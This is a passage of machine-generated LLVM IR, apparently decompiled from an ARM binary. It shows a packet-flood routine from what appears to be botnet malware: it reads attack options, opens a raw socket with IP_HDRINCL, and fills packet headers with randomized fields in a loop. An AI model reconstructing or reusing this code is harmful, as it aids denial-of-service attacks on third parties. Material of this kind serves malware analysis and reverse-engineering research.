  store i32 %v1_8a24, i32* %ip.global-to-local, align 4
  %v0_8a28 = load i32, i32* @r5, align 4
  store i32 %v0_8a28, i32* %r1.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_8a34 = load i32, i32* @r4, align 4
  store i32 %v0_8a34, i32* %r0.global-to-local, align 4
  %v6_8a3c = inttoptr i32 %v0_8a28 to i32*
  %v7_8a3c = call i32 @attack_get_opt_int(i32 %v0_8a34, i32* %v6_8a3c, i32 5, i32 1, i32 %v1_8a24)
  %v1_8a48 = urem i32 %v7_8a3c, 256
  store i32 %v1_8a48, i32* %ip.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  %v0_8a54 = load i32, i32* @r5, align 4
  store i32 %v0_8a54, i32* %r1.global-to-local, align 4
  %v0_8a58 = load i32, i32* @r4, align 4
  store i32 %v0_8a58, i32* %r0.global-to-local, align 4
  %v5_8a60 = inttoptr i32 %v0_8a54 to i32*
  %v6_8a60 = call i32 @attack_get_opt_int(i32 %v0_8a58, i32* %v5_8a60, i32 6, i32 65535, i32 %v1_8a48)
  %v0_8a68 = load i32, i32* @r5, align 4
  store i32 %v0_8a68, i32* %r1.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  store i32 %v6_8a60, i32* @r8, align 4
  %v0_8a78 = load i32, i32* @r4, align 4
  store i32 %v0_8a78, i32* %r0.global-to-local, align 4
  %v5_8a7c = inttoptr i32 %v0_8a68 to i32*
  %v6_8a7c = call i32 @attack_get_opt_int(i32 %v0_8a78, i32* %v5_8a7c, i32 7, i32 65535, i32 ptrtoint (i32* @0 to i32))
  %v0_8a80 = load i32, i32* @r5, align 4
  store i32 %v0_8a80, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 512, i32* %r3.global-to-local, align 4
  store i32 %v6_8a7c, i32* @r7, align 4
  %v0_8a90 = load i32, i32* @r4, align 4
  store i32 %v0_8a90, i32* %r0.global-to-local, align 4
  %v5_8a94 = inttoptr i32 %v0_8a80 to i32*
  %v6_8a94 = call i32 @attack_get_opt_int(i32 %v0_8a90, i32* %v5_8a94, i32 0, i32 512, i32 ptrtoint (i32* @0 to i32))
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_8aa4 = load i32, i32* @r5, align 4
  store i32 %v0_8aa4, i32* %r1.global-to-local, align 4
  %v0_8aa8 = load i32, i32* @r4, align 4
  store i32 %v0_8aa8, i32* %r0.global-to-local, align 4
  %v5_8aac = inttoptr i32 %v0_8aa4 to i32*
  %v6_8aac = call i32 @attack_get_opt_int(i32 %v0_8aa8, i32* %v5_8aac, i32 1, i32 1, i32 ptrtoint (i32* @0 to i32))
  %v1_8ab4 = urem i32 %v6_8aac, 256
  store i32 %v1_8ab4, i32* %ip.global-to-local, align 4
  %v0_8ab8 = load i32, i32* @r5, align 4
  store i32 %v0_8ab8, i32* %r1.global-to-local, align 4
  store i32 19, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_8ac4 = load i32, i32* @r4, align 4
  store i32 %v0_8ac4, i32* %r0.global-to-local, align 4
  %v5_8acc = inttoptr i32 %v0_8ab8 to i32*
  %v6_8acc = call i32 @attack_get_opt_int(i32 %v0_8ac4, i32* %v5_8acc, i32 19, i32 0, i32 %v1_8ab4)
  %v0_8ad4 = load i32, i32* @r5, align 4
  store i32 %v0_8ad4, i32* %r1.global-to-local, align 4
  %v2_8ad8 = load i32, i32* @global_var_2471c.58, align 4
  store i32 %v2_8ad8, i32* %r3.global-to-local, align 4
  store i32 %v6_8acc, i32* @r6, align 4
  store i32 25, i32* %r2.global-to-local, align 4
  %v0_8ae4 = load i32, i32* @r4, align 4
  store i32 %v0_8ae4, i32* %r0.global-to-local, align 4
  %v5_8ae8 = inttoptr i32 %v0_8ad4 to i32*
  %v6_8ae8 = call i32 @attack_get_opt_int(i32 %v0_8ae4, i32* %v5_8ae8, i32 25, i32 %v2_8ad8, i32 ptrtoint (i32* @0 to i32))
  store i32 3, i32* %r1.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  %v3_8afc = call i32 @socket(i32 2, i32 3, i32 6)
  store i32 %v3_8afc, i32* %r0.global-to-local, align 4
  %v7_8b00 = icmp eq i32 %v3_8afc, -1
  store i1 %v7_8b00, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_8b00, label %dec_label_pc_9014, label %dec_label_pc_8b0c

dec_label_pc_8b0c:                                ; preds = %entry
  store i32 1, i32* %stack_var_-44, align 4
  %v6_8b14 = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v6_8b14, i32* %r3.global-to-local, align 4
  store i32 4, i32* %ip.global-to-local, align 4
  store i32 0, i32* @r1, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v5_8b28 = call i32 @__GI_setsockopt(i32 %v3_8afc, i32 0, i32 3, i32 %v6_8b14, i32 4)
  store i32 %v5_8b28, i32* %r0.global-to-local, align 4
  %v7_8b2c = icmp eq i32 %v5_8b28, -1
  store i1 %v7_8b2c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_8b2c, label %dec_label_pc_900c, label %dec_label_pc_8b34

dec_label_pc_8b34:                                ; preds = %dec_label_pc_8b0c
  %v0_8b34 = load i32, i32* @r8, align 4
  %v0_8b38 = load i32, i32* @r7, align 4
  %v0_8b3c = load i32, i32* %fp.global-to-local, align 4
  %v0_8b40 = load i32, i32* @r6, align 4
  %v1_8b40 = urem i32 %v0_8b40, 256
  store i32 0, i32* %r1.global-to-local, align 4
  %v3_8b48 = urem i32 %v0_8b34, 65536
  store i32 %v3_8b48, i32* %r3.global-to-local, align 4
  %v3_8b4c = urem i32 %v0_8b38, 65536
  store i32 %v3_8b4c, i32* %r4.global-to-local, align 4
  %v0_8b50 = load i32, i32* @sl, align 4
  %v2_8b50 = icmp eq i32 %v0_8b50, 0
  store i1 %v2_8b50, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  %v3_8b68 = urem i32 %v0_8b3c, 65536
  store i32 %v3_8b68, i32* @fp, align 4
  br i1 %v2_8b50, label %dec_label_pc_9020, label %dec_label_pc_8b78

dec_label_pc_8b78:                                ; preds = %dec_label_pc_8b34
  %v3_8b38 = mul i32 %v0_8b38, 65536
  %v3_8b34 = mul i32 %v0_8b34, 65536
  %v0_8b3c.not = or i32 %v0_8b3c, -65536
  %v1_8b7c = xor i32 %v0_8b3c.not, 65535
  %v3_8b80 = mul i32 %v6_8a94, 65536
  %v1_8b84 = add i32 %v3_8b80, 4325376
  %tmp73 = udiv i32 %v1_8b84, 256
  %v3_8b98 = and i32 %tmp73, 65280
  %tmp74 = mul nsw i32 %v1_8b7c, 256
  %v3_8b9c = and i32 %tmp74, 65280
  store i32 %v3_8b9c, i32* %ip.global-to-local, align 4
  %v1_8ba0 = add i32 %v3_8b80, 524288
  %v1_8ba8 = add i32 %v3_8b80, 1835008
  %tmp75 = udiv i32 %v1_8b7c, 256
  %v4_8bac = urem i32 %tmp75, 256
  %v5_8bac = or i32 %v4_8bac, %v3_8b9c
  %v4_8bb4 = udiv i32 %v1_8b84, 16777216
  %v5_8bb4 = or i32 %v3_8b98, %v4_8bb4
  store i32 %v5_8bb4, i32* @r8, align 4
  %v3_8bc0 = udiv i32 %v1_8ba8, 256
  %tmp76 = mul i32 %v0_8b3c, 256
  %v3_8bc4 = and i32 %tmp76, 65280
  store i32 %v3_8b34, i32* %r2.global-to-local, align 4
  %tmp77 = udiv i32 %v0_8b3c, 256
  %v4_8bd4 = urem i32 %tmp77, 256
  %v5_8bd4 = or i32 %v4_8bd4, %v3_8bc4
  store i32 %v5_8bd4, i32* %r0.global-to-local, align 4
  %tmp78 = mul i32 %v0_8b34, 256
  %v3_8bd8 = and i32 %tmp78, 65280
  %v1_8bdc = and i32 %v3_8bc0, 65280
  store i32 %v1_8bdc, i32* @r6, align 4
  store i32 %v3_8b38, i32* %r1.global-to-local, align 4
  %tmp79 = mul i32 %v0_8b38, 256
  %v3_8be8 = and i32 %tmp79, 65280
  %tmp80 = udiv i32 %v0_8b34, 256
  %v4_8bec = urem i32 %tmp80, 256
  %v5_8bec = or i32 %v4_8bec, %v3_8bd8
  store i32 %v5_8bec, i32* @lr, align 4
  %v4_8bf0 = udiv i32 %v1_8ba8, 16777216
  %v5_8bf0 = or i32 %v1_8bdc, %v4_8bf0
  store i32 %v5_8bf0, i32* %r3.global-to-local, align 4
  %tmp81 = udiv i32 %v0_8b38, 256
  %v4_8bf4 = urem i32 %tmp81, 256
  %v5_8bf4 = or i32 %v4_8bf4, %v3_8be8
  %tmp82 = udiv i32 %v1_8ba0, 256
  %v3_8bf8 = and i32 %tmp82, 65280
  store i32 %v3_8bf8, i32* @r5, align 4
  %v5_8bfc = trunc i32 %v5_8bd4 to i16
  %v5_8c04 = trunc i32 %v5_8bf0 to i16
  %v4_8c0c = udiv i32 %v1_8ba0, 16777216
  %v5_8c0c = or i32 %v3_8bf8, %v4_8c0c
  store i32 %v5_8c0c, i32* @r7, align 4
  store i32 0, i32* @r4, align 4
  %v1_8c74 = trunc i32 %v6_8a1c to i8
  %sext = mul nuw i32 %v5_8bac, 65536
  %v4_8d00 = sdiv i32 %sext, 65536
  %v2_8d2c = icmp eq i32 %v1_8b40, 0
  %sext8 = mul nuw i32 %v5_8bec, 65536
  %v4_8d4c = sdiv i32 %sext8, 65536
  %sext9 = mul nuw i32 %v5_8bf4, 65536
  %v4_8d54 = sdiv i32 %sext9, 65536
  %v1_8d0c27 = trunc i32 %v4_8d00 to i16
  br label %dec_label_pc_8c14

dec_label_pc_8c14:                                ; preds = %bb85, %dec_label_pc_8b78
  store i32 4, i32* %r1.global-to-local, align 4
  store i32 1510, i32* %r0.global-to-local, align 4
  %v2_8c20 = call i32 @calloc(i32 1510, i32 4)
  store i32 %v2_8c20, i32* %r0.global-to-local, align 4
  %v2_8c28 = load i32, i32* @r4, align 4
  %v5_8c28 = mul i32 %v2_8c28, 4
  %v6_8c28 = add i32 %v5_8c28, %v2_89c8
  %v7_8c28 = inttoptr i32 %v6_8c28 to i32*
  store i32 %v2_8c20, i32* %v7_8c28, align 4
  %v3_8c2c = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_8c2c, i32* %r2.global-to-local, align 4
  %v5_8c34 = mul i32 %v3_8c2c, 24
  %v1_8c38 = load i32, i32* @sb, align 4
  %v2_8c38 = add i32 %v1_8c38, %v5_8c34
  store i32 %v2_8c38, i32* @lr, align 4
  store i32 %v2_89c8, i32* %r3.global-to-local, align 4
  %v4_8c40 = mul i32 %v3_8c2c, 4
  %v5_8c40 = add i32 %v4_8c40, %v2_89c8
  %v6_8c40 = inttoptr i32 %v5_8c40 to i32*
  %v7_8c40 = load i32, i32* %v6_8c40, align 4
  store i32 %v7_8c40, i32* %r4.global-to-local, align 4
  %v1_8c44 = inttoptr i32 %v7_8c40 to i8*
  %v2_8c44 = load i8, i8* %v1_8c44, align 1
  %tmp = urem i8 %v2_8c44, 16
  %v1_8c48 = zext i8 %tmp to i32
  %v1_8c4c = or i32 %v1_8c48, 64
  store i32 %v1_8c4c, i32* %r3.global-to-local, align 4
  %v1_8c50 = trunc i32 %v1_8c4c to i8
  store i8 %v1_8c50, i8* %v1_8c44, align 1
  %v0_8c54 = load i32, i32* %r4.global-to-local, align 4
  %v1_8c54 = inttoptr i32 %v0_8c54 to i8*
  %v2_8c54 = load i8, i8* %v1_8c54, align 1
  %v1_8c58 = and i8 %v2_8c54, -16
  %v1_8c5c = or i8 %v1_8c58, 5
  store i32 %v1_8a48, i32* %r5.global-to-local, align 4
  store i8 %v1_8c5c, i8* %v1_8c54, align 1
  store i32 %v6_89e0, i32* %r1.global-to-local, align 4
  %v2_8c6c = load i32, i32* %r4.global-to-local, align 4
  %v3_8c6c = add i32 %v2_8c6c, 1
  %v4_8c6c = inttoptr i32 %v3_8c6c to i8*
  store i8 %v5_8a00, i8* %v4_8c6c, align 1
  store i32 %v1_8a24, i32* %r2.global-to-local, align 4
  %v2_8c74 = load i32, i32* %r4.global-to-local, align 4
  %v3_8c74 = add i32 %v2_8c74, 8
  %v4_8c74 = inttoptr i32 %v3_8c74 to i8*
  store i8 %v1_8c74, i8* %v4_8c74, align 1
  %v2_8c7c = load i32, i32* %r4.global-to-local, align 4
  %v3_8c7c = add i32 %v2_8c7c, 4
  %v4_8c7c = inttoptr i32 %v3_8c7c to i16*
  store i16 %v5_8bfc, i16* %v4_8c7c, align 2
  %v2_8c84 = load i32, i32* %r4.global-to-local, align 4
  %v3_8c84 = add i32 %v2_8c84, 9
  %v4_8c84 = inttoptr i32 %v3_8c84 to i8*
  store i8 47, i8* %v4_8c84, align 1
  store i32 %v6_8ae8, i32* %r3.global-to-local, align 4
  %v0_8c8c = load i32, i32* %r5.global-to-local, align 4
  %v2_8c8c = icmp eq i32 %v0_8c8c, 0
  store i1 %v2_8c8c, i1* %cpsr_z.global-to-local, align 1
  %v1_8c90 = load i32, i32* %r4.global-to-local, align 4
  %v2_8c90 = add i32 %v1_8c90, 12
  %v3_8c90 = inttoptr i32 %v2_8c90 to i32*
  store i32 %v6_8ae8, i32* %v3_8c90, align 4
  br i1 %v2_8c8c, label %.thread25, label %bb

bb:                                               ; preds = %dec_label_pc_8c14
  store i32 64, i32* %r2.global-to-local, align 4
  %v3_8c98 = load i32, i32* %r4.global-to-local, align 4
  %v4_8c98 = add i32 %v3_8c98, 6
  %v5_8c98 = inttoptr i32 %v4_8c98 to i16*
  store i16 64, i16* %v5_8c98, align 2
  br label %.thread25

.thread25:                                        ; preds = %dec_label_pc_8c14, %bb
  %v0_8c9c = load i32, i32* @lr, align 4
  %v1_8c9c = add i32 %v0_8c9c, 16
  %v2_8c9c = inttoptr i32 %v1_8c9c to i32*
  %v3_8c9c = load i32, i32* %v2_8c9c, align 4
  store i32 22528, i32* %ip.global-to-local, align 4
  %v1_8ca4 = load i32, i32* %r4.global-to-local, align 4
  %v2_8ca4 = add i32 %v1_8ca4, 16
  %v3_8ca4 = inttoptr i32 %v2_8ca4 to i32*
  store i32 %v3_8c9c, i32* %v3_8ca4, align 4
  %v0_8ca8 = load i32, i32* %r4.global-to-local, align 4
  %v1_8ca8 = add i32 %v0_8ca8, 24
  store i32 %v1_8ca8, i32* %r1.global-to-local, align 4
  %v1_8cac = add i32 %v0_8ca8, 20
  store i32 %v1_8cac, i32* %r0.global-to-local, align 4
  %v0_8cb0 = load i32, i32* %ip.global-to-local, align 4
  %v1_8cb0 = add i32 %v0_8cb0, 101
  store i32 %v1_8cb0, i32* %ip.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 8, i32* %r2.global-to-local, align 4
  %v0_8cbc = load i32, i32* @r8, align 4
  %v1_8cbc = trunc i32 %v0_8cbc to i16
  %v3_8cbc = add i32 %v0_8ca8, 2
  %v4_8cbc = inttoptr i32 %v3_8cbc to i16*
  store i16 %v1_8cbc, i16* %v4_8cbc, align 2
  %v0_8cc0 = load i32, i32* %ip.global-to-local, align 4
  %v1_8cc0 = trunc i32 %v0_8cc0 to i16
  %v2_8cc0 = load i32, i32* %r0.global-to-local, align 4
  %v3_8cc0 = add i32 %v2_8cc0, 2
  %v4_8cc0 = inttoptr i32 %v3_8cc0 to i16*
  store i16 %v1_8cc0, i16* %v4_8cc0, align 2
  %v0_8cc4 = load i32, i32* %r3.global-to-local, align 4
  %v1_8cc4 = trunc i32 %v0_8cc4 to i8
  %v2_8cc4 = load i32, i32* %r1.global-to-local, align 4
  %v3_8cc4 = add i32 %v2_8cc4, 13
  %v4_8cc4 = inttoptr i32 %v3_8cc4 to i8*
  store i8 %v1_8cc4, i8* %v4_8cc4, align 1
  %v0_8cc8 = load i32, i32* %r2.global-to-local, align 4
  %v1_8cc8 = trunc i32 %v0_8cc8 to i8
  %v2_8cc8 = load i32, i32* %r1.global-to-local, align 4
  %v3_8cc8 = add i32 %v2_8cc8, 12
  %v4_8cc8 = inttoptr i32 %v3_8cc8 to i8*
  store i8 %v1_8cc8, i8* %v4_8cc8, align 1
  %v0_8ccc = load i32, i32* %r4.global-to-local, align 4
  %v1_8ccc = add i32 %v0_8ccc, 38
  %v2_8ccc = inttoptr i32 %v1_8ccc to i8*
  %v3_8ccc = load i8, i8* %v2_8ccc, align 1
  %tmp89 = urem i8 %v3_8ccc, 16
  %v1_8cd0 = zext i8 %tmp89 to i32
  %v1_8cd4 = or i32 %v1_8cd0, 64
  store i32 %v1_8cd4, i32* %r3.global-to-local, align 4
  %v1_8cd8 = trunc i32 %v1_8cd4 to i8
  store i8 %v1_8cd8, i8* %v2_8ccc, align 1
  %v0_8cdc = load i32, i32* %r4.global-to-local, align 4
  %v1_8cdc = add i32 %v0_8cdc, 38
  %v2_8cdc = inttoptr i32 %v1_8cdc to i8*
  %v3_8cdc = load i8, i8* %v2_8cdc, align 1
  %v1_8ce0 = and i8 %v3_8cdc, -16
  %v1_8ce4 = or i8 %v1_8ce0, 5
  store i8 %v1_8ce4, i8* %v2_8cdc, align 1
  %v0_8cf0 = load i32, i32* %r4.global-to-local, align 4
  %v1_8cf0 = add i32 %v0_8cf0, 38
  store i32 %v1_8cf0, i32* @r5, align 4
  %v3_8cf4 = add i32 %v0_8cf0, 39
  %v4_8cf4 = inttoptr i32 %v3_8cf4 to i8*
  store i8 %v5_8a00, i8* %v4_8cf4, align 1
  store i32 %v5_8bf0, i32* %r2.global-to-local, align 4
  %v2_8cfc = load i32, i32* @r5, align 4
  %v3_8cfc = add i32 %v2_8cfc, 2
  %v4_8cfc = inttoptr i32 %v3_8cfc to i16*
  store i16 %v5_8c04, i16* %v4_8cfc, align 2
  store i32 %v4_8d00, i32* %r3.global-to-local, align 4
  store i32 %v1_8a24, i32* %r1.global-to-local, align 4
  %v0_8d08 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_8d08, label %.thread26, label %bb83

.thread26:                                        ; preds = %.thread25
  %v2_8d0c28 = load i32, i32* @r5, align 4
  %v3_8d0c29 = add i32 %v2_8d0c28, 4
  %v4_8d0c30 = inttoptr i32 %v3_8d0c29 to i16*
  store i16 %v1_8d0c27, i16* %v4_8d0c30, align 2
  store i32 17, i32* %r3.global-to-local, align 4
  br label %bb84

bb83:                                             ; preds = %.thread25
  store i32 64, i32* %r2.global-to-local, align 4
  %v2_8d0c = load i32, i32* @r5, align 4
  %v3_8d0c = add i32 %v2_8d0c, 4
  %v4_8d0c = inttoptr i32 %v3_8d0c to i16*
  store i16 %v1_8d0c27, i16* %v4_8d0c, align 2
  store i32 17, i32* %r3.global-to-local, align 4
  %v1_8d14 = load i32, i32* %r2.global-to-local, align 4
  %v2_8d14 = trunc i32 %v1_8d14 to i16
  %v3_8d14 = load i32, i32* @r5, align 4
  %v4_8d14 = add i32 %v3_8d14, 6
  %v5_8d14 = inttoptr i32 %v4_8d14 to i16*
  store i16 %v2_8d14, i16* %v5_8d14, align 2
  br label %bb84

bb84:                                             ; preds = %.thread26, %bb83
  %v0_8d18 = load i32, i32* %r1.global-to-local, align 4
  %v1_8d18 = trunc i32 %v0_8d18 to i8
  %v2_8d18 = load i32, i32* @r5, align 4
  %v3_8d18 = add i32 %v2_8d18, 8
  %v4_8d18 = inttoptr i32 %v3_8d18 to i8*
  store i8 %v1_8d18, i8* %v4_8d18, align 1
  %v0_8d1c = load i32, i32* %r3.global-to-local, align 4
  %v1_8d1c = trunc i32 %v0_8d1c to i8
  %v2_8d1c = load i32, i32* @r5, align 4
  %v3_8d1c = add i32 %v2_8d1c, 9
  %v4_8d1c = inttoptr i32 %v3_8d1c to i8*
  store i8 %v1_8d1c, i8* %v4_8d1c, align 1
  %v0_8d20 = call i32 @rand_next()
  store i32 %v0_8d20, i32* %r0.global-to-local, align 4
  store i32 %v1_8b40, i32* %r1.global-to-local, align 4
  store i1 %v2_8d2c, i1* %cpsr_z.global-to-local, align 1
  %v1_8d30 = sub i32 1023, %v0_8d20
  store i32 %v1_8d30, i32* %r3.global-to-local, align 4
  br i1 %v2_8d2c, label %.thread, label %.thread10

.thread:                                          ; preds = %bb84
  %v2_8d38 = load i32, i32* @r5, align 4
  %v3_8d38 = add i32 %v2_8d38, 16
  %v4_8d38 = inttoptr i32 %v3_8d38 to i32*
  store i32 %v1_8d30, i32* %v4_8d38, align 4
  br label %bb85

.thread10:                                        ; preds = %bb84
  %v1_8d34 = load i32, i32* %r4.global-to-local, align 4
  %v2_8d34 = add i32 %v1_8d34, 16
  %v3_8d34 = inttoptr i32 %v2_8d34 to i32*
  %v4_8d34 = load i32, i32* %v3_8d34, align 4
  store i32 %v4_8d34, i32* %r3.global-to-local, align 4
  %v2_8d3c = load i32, i32* @r5, align 4
  %v3_8d3c = add i32 %v2_8d3c, 16
  %v4_8d3c = inttoptr i32 %v3_8d3c to i32*
  store i32 %v4_8d34, i32* %v4_8d3c, align 4
  br label %bb85

bb85:                                             ; preds = %.thread, %.thread10
  %v1_8d40 = load i32, i32* @r5, align 4
  %v2_8d40 = add i32 %v1_8d40, 12
  %v3_8d40 = inttoptr i32 %v2_8d40 to i32*
  store i32 %v0_8d20, i32* %v3_8d40, align 4
  %v3_8d44 = load i32, i32* %stack_var_-44, align 4
  %v0_8d48 = load i32, i32* %r4.global-to-local, align 4
  %v1_8d48 = add i32 %v0_8d48, 58
  store i32 %v1_8d48, i32* @r6, align 4
  store i32 %v4_8d4c, i32* %r2.global-to-local, align 4
  %v1_8d50 = add i32 %v3_8d44, 1
  store i32 %v1_8d50, i32* @r4, align 4
  store i32 %v4_8d54, i32* %r3.global-to-local, align 4
  %v1_8d58 = load i32, i32* @sl, align 4
  %v9_8d58 = icmp eq i32 %v1_8d50, %v1_8d58
  store i1 %v9_8d58, i1* %cpsr_z.global-to-local, align 1
  %v0_8d5c = load i32, i32* @r7, align 4
  %v1_8d5c = trunc i32 %v0_8d5c to i16
  %v3_8d5c = add i32 %v0_8d48, 62
  %v4_8d5c = inttoptr i32 %v3_8d5c to i16*
  store i16 %v1_8d5c, i16* %v4_8d5c, align 2
  %v0_8d60 = load i32, i32* %r2.global-to-local, align 4
  %v1_8d60 = trunc i32 %v0_8d60 to i16
  %v2_8d60 = load i32, i32* @r6, align 4
  %v3_8d60 = inttoptr i32 %v2_8d60 to i16*
  store i16 %v1_8d60, i16* %v3_8d60, align 2
  %v0_8d64 = load i32, i32* %r3.global-to-local, align 4
  %v1_8d64 = trunc i32 %v0_8d64 to i16
  %v2_8d64 = load i32, i32* @r6, align 4
  %v3_8d64 = add i32 %v2_8d64, 2
  %v4_8d64 = inttoptr i32 %v3_8d64 to i16*
  store i16 %v1_8d64, i16* %v4_8d64, align 2
  %v0_8d68 = load i32, i32* @r4, align 4
  store i32 %v0_8d68, i32* %stack_var_-44, align 4
  %v5_8d6c = icmp slt i32 %v1_8d50, %v1_8d58
  br i1 %v5_8d6c, label %dec_label_pc_8c14, label %dec_label_pc_8d70

dec_label_pc_8d70:                                ; preds = %bb85
  %v1_8d78 = add i32 %v6_8a94, 8
  store i32 %v1_8d78, i32* %r4.global-to-local, align 4
  %v1_8d7c = add i32 %v6_8a94, 66
  store i32 %v1_8d7c, i32* %r5.global-to-local, align 4
  %v0_8d8c.pre.pre = load i32, i32* @sl, align 4
  br label %dec_label_pc_8d88.preheader

dec_label_pc_8d88.preheader:                      ; preds = %dec_label_pc_8d70, %dec_label_pc_9020
  %v0_8d8c.pre = phi i32 [ %v0_8d8c.pre.pre, %dec_label_pc_8d70 ], [ 0, %dec_label_pc_9020 ]
  %stack_var_-132.0.ph = phi i32 [ %v1_8d7c, %dec_label_pc_8d70 ], [ %v1_902c, %dec_label_pc_9020 ]
  %stack_var_-136.0.ph = phi i32 [ %v1_8d78, %dec_label_pc_8d70 ], [ %v1_9028, %dec_label_pc_9020 ]
  %v2_8fdc = icmp eq i32 %v1_8b40, 0
  %v2_8e24 = ptrtoint i32* %stack_var_-48 to i32
  %v2_8e3c = ptrtoint i32* %stack_var_-52 to i32
  %v2_8e4c = ptrtoint i32* %stack_var_-56 to i32
  %v2_8e58 = ptrtoint i32* %stack_var_-54 to i32
  %v2_8e6c = icmp eq i32 %v1_8ab4, 0
  %v2_8dcc = icmp eq i32 %v6_8ae8, -1
  %v7_8dcc = icmp eq i32 %v6_8ae8, -1
  br label %dec_label_pc_8d88

dec_label_pc_8d88:                                ; preds = %dec_label_pc_8d88, %dec_label_pc_8e74, %dec_label_pc_8d88.preheader
  %v0_8d8c = phi i32 [ %v0_8d8c.pre, %dec_label_pc_8d88.preheader ], [ 0, %dec_label_pc_8d88 ], [ %v1_8f10, %dec_label_pc_8e74 ]
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_8d8c = icmp eq i32 %v0_8d8c, 0
  store i1 %v2_8d8c, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  br i1 %v2_8d8c, label %dec_label_pc_8d88, label %dec_label_pc_8d98

dec_label_pc_8d98:                                ; preds = %dec_label_pc_8d88
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_8d9c

dec_label_pc_8d9c:                                ; preds = %dec_label_pc_8e74, %dec_label_pc_8d98
  %v1_8db0 = phi i32 [ %v1_8f0c, %dec_label_pc_8e74 ], [ 0, %dec_label_pc_8d98 ]
  %v5_8da0 = mul i32 %v1_8db0, 24
  %v1_8da4 = load i32, i32* @sb, align 4
  %v2_8da4 = add i32 %v1_8da4, %v5_8da0
  store i32 %v2_8da4, i32* %r3.global-to-local, align 4
  store i32 %v2_89c8, i32* %r4.global-to-local, align 4
  %v1_8dac = add i32 %v2_8da4, 20
  %v2_8dac = inttoptr i32 %v1_8dac to i8*
  %v3_8dac = load i8, i8* %v2_8dac, align 1
  %v4_8dac = zext i8 %v3_8dac to i32
  store i32 %v4_8dac, i32* %r2.global-to-local, align 4
  %v4_8db0 = mul i32 %v1_8db0, 4
  %v5_8db0 = add i32 %v4_8db0, %v2_89c8
  %v6_8db0 = inttoptr i32 %v5_8db0 to i32*
  %v7_8db0 = load i32, i32* %v6_8db0, align 4
  store i32 %v7_8db0, i32* @r5, align 4
  %v7_8db4 = icmp eq i8 %v3_8dac, 31
  store i1 %v7_8db4, i1* %cpsr_z.global-to-local, align 1
  %v1_8db8 = add i32 %v7_8db0, 24
  store i32 %v1_8db8, i32* @r7, align 4
  %v1_8dbc = add i32 %v7_8db0, 38
  store i32 %v1_8dbc, i32* @r6, align 4
  %v1_8dc0 = add i32 %v7_8db0, 58
  store i32 %v1_8dc0, i32* @r8, align 4
  %tmp90 = icmp ult i8 %v3_8dac, 32
  br i1 %tmp90, label %dec_label_pc_8f20, label %dec_label_pc_8dc8

dec_label_pc_8dc8:                                ; preds = %dec_label_pc_8d9c
  store i32 %v6_8ae8, i32* %r1.global-to-local, align 4
  store i1 %v7_8dcc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_8dcc, label %dec_label_pc_8f80, label %dec_label_pc_8dd4

dec_label_pc_8dd4:                                ; preds = %dec_label_pc_8f20, %dec_label_pc_8dc8
  store i32 65535, i32* %r4.global-to-local, align 4
  %v0_8ddc = load i32, i32* @fp, align 4
  %v9_8ddc = icmp eq i32 %v0_8ddc, 65535
  store i1 %v9_8ddc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_8ddc, label %dec_label_pc_8f98, label %dec_label_pc_8de4

dec_label_pc_8de4:                                ; preds = %dec_label_pc_8f80.dec_label_pc_8de4_crit_edge, %dec_label_pc_8dd4
  %v1_8de8 = phi i32 [ %v1_8de8.pre, %dec_label_pc_8f80.dec_label_pc_8de4_crit_edge ], [ 65535, %dec_label_pc_8dd4 ]
  store i32 %v3_8b48, i32* %r2.global-to-local, align 4
  %v9_8de8 = icmp eq i32 %v3_8b48, %v1_8de8
  store i1 %v9_8de8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_8de8, label %dec_label_pc_8fc0, label %dec_label_pc_8df0

dec_label_pc_8df0:                                ; preds = %dec_label_pc_8f98.dec_label_pc_8df0_crit_edge, %dec_label_pc_8de4
  %v1_8df4 = phi i32 [ %v1_8df4.pre, %dec_label_pc_8f98.dec_label_pc_8df0_crit_edge ], [ %v1_8de8, %dec_label_pc_8de4 ]
  store i32 %v3_8b4c, i32* %r3.global-to-local, align 4
  %v9_8df4 = icmp eq i32 %v3_8b4c, %v1_8df4
  store i1 %v9_8df4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_8df4, label %dec_label_pc_8fd4, label %dec_label_pc_8dfc

dec_label_pc_8dfc:                                ; preds = %dec_label_pc_8fc0, %dec_label_pc_8df0
  store i32 %v1_8b40, i32* @r4, align 4
  store i1 %v2_8fdc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_8fdc, label %dec_label_pc_8ff0, label %.thread11

.thread11:                                        ; preds = %dec_label_pc_8dfc
  %v1_8e04 = load i32, i32* @r5, align 4
  %v2_8e04 = add i32 %v1_8e04, 16
  %v3_8e04 = inttoptr i32 %v2_8e04 to i32*
  %v4_8e04 = load i32, i32* %v3_8e04, align 4
  store i32 %v4_8e04, i32* %r3.global-to-local, align 4
  %v2_8e08 = load i32, i32* @r6, align 4
  %v3_8e08 = add i32 %v2_8e08, 16
  %v4_8e08 = inttoptr i32 %v3_8e08 to i32*
  store i32 %v4_8e04, i32* %v4_8e08, align 4
  br label %dec_label_pc_8e10

